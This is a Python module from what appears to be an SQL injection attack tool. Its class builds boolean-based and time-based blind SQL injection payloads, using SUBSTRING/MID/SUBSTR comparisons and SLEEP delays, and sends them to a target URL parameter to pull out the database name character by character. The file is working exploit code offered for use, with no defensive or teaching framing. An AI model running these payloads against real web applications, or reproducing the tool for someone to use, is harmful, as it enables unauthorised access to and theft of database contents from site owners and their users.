"""
Data Extraction Module for SQL Injection
"""

import time
import string
from urllib.parse import quote
from colorama import Fore

from .utils import Color

class DataExtractor:
    """Data extraction engine for SQL injection"""
    
    def __init__(self, session, timeout=10, verbose=False):
        self.session = session
        self.timeout = timeout
        self.verbose = verbose
        
        # Character set for extraction
        self.charset = string.ascii_letters + string.digits + "_-."
        
        # State
        self.baseline = None
        self.baseline_length = 0
        self.baseline_content = ""
        self.current_method = None
        
    def _get_baseline(self, url, param):
        """Get baseline response"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            self.baseline = response
            self.baseline_length = len(response.text)
            self.baseline_content = response.text
            return True
        except:
            return False
    
    def _is_different(self, response):
        """Check if response differs"""
        if not response:
            return True
        length_diff = abs(len(response.text) - self.baseline_length)
        return length_diff > (self.baseline_length * 0.1)
    
    def _test_payload(self, url, param, payload):
        """Test payload"""
        try:
            test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
            return self.session.get(test_url, timeout=self.timeout)
        except:
            return None
    
    def _boolean_extract(self, url, param, query, max_length=50):
        """Extract using boolean-based blind injection"""
        extracted = ""
        
        for pos in range(1, max_length + 1):
            found = False
            for char in self.charset:
                # Try different substring methods
                substr_methods = [
                    f"SUBSTRING(({query}),{pos},1)='{char}'",
                    f"MID(({query}),{pos},1)='{char}'",
                    f"SUBSTR(({query}),{pos},1)='{char}'"
                ]
                
                for substr in substr_methods:
                    payload = f"1' AND {substr}--"
                    response = self._test_payload(url, param, payload)
                    
                    if response and not self._is_different(response):
                        extracted += char
                        print(f"{Color.GREEN}[+] {query}: {extracted}{Color.RESET}")
                        found = True
                        break
                
                if found:
                    break
            
            if not found:
                break
        
        return extracted
    
    def _time_extract(self, url, param, query, max_length=50):
        """Extract using time-based blind injection"""
        extracted = ""
        
        for pos in range(1, max_length + 1):
            found = False
            for char in self.charset:
                substr = f"SUBSTRING(({query}),{pos},1)='{char}'"
                payload = f"1' AND IF({substr}, SLEEP(3), 0)--"
                
                try:
                    test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
                    start = time.time()
                    self.session.get(test_url, timeout=self.timeout+5)
                    elapsed = time.time() - start
                    
                    if elapsed >= 2:
                        extracted += char
                        print(f"{Color.GREEN}[+] {query}: {extracted}{Color.RESET}")
                        found = True
                        break
                except:
                    continue
            
            if not found:
                break
        
        return extracted
    
    def extract_database(self, url, param, method):
        """Extract database name"""
        print(f"{Color.YELLOW}[*] Extracting database name...{Color.RESET}")
        
        if 'Boolean' in method:
            self._get_baseline(url, param)
            return self._boolean_extract(url, param, "database()")
        elif 'Time' in method:
            return self._time_extract(url, param, "database()")
        else:
            return None
    
    def extract_all(self, url, param, method):
        """Extract all data from vulnerable parameter"""
        
        self.current_method = method
        
        # Extract database
        database = self.extract_database(url, param, method)
        if not database:
            return None
        
        result = {'database': database}
        
        return result